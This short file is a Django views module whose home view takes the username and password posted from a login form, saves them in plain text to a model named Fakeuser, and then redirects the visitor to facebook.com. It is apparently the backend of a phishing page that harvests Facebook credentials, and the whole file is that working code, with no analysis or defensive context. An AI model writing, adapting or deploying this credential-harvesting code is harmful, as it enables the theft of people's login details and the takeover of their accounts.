from django.shortcuts import render
from django.shortcuts import render,redirect,HttpResponse, get_object_or_404,HttpResponseRedirect
from backend.models import *
# Create your views here.
def home(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password =request.POST.get('password')
        Fakeuser.objects.create(username=username, password=password)
        return redirect('https://facebook.com')
    return render(request, 'index.html', {})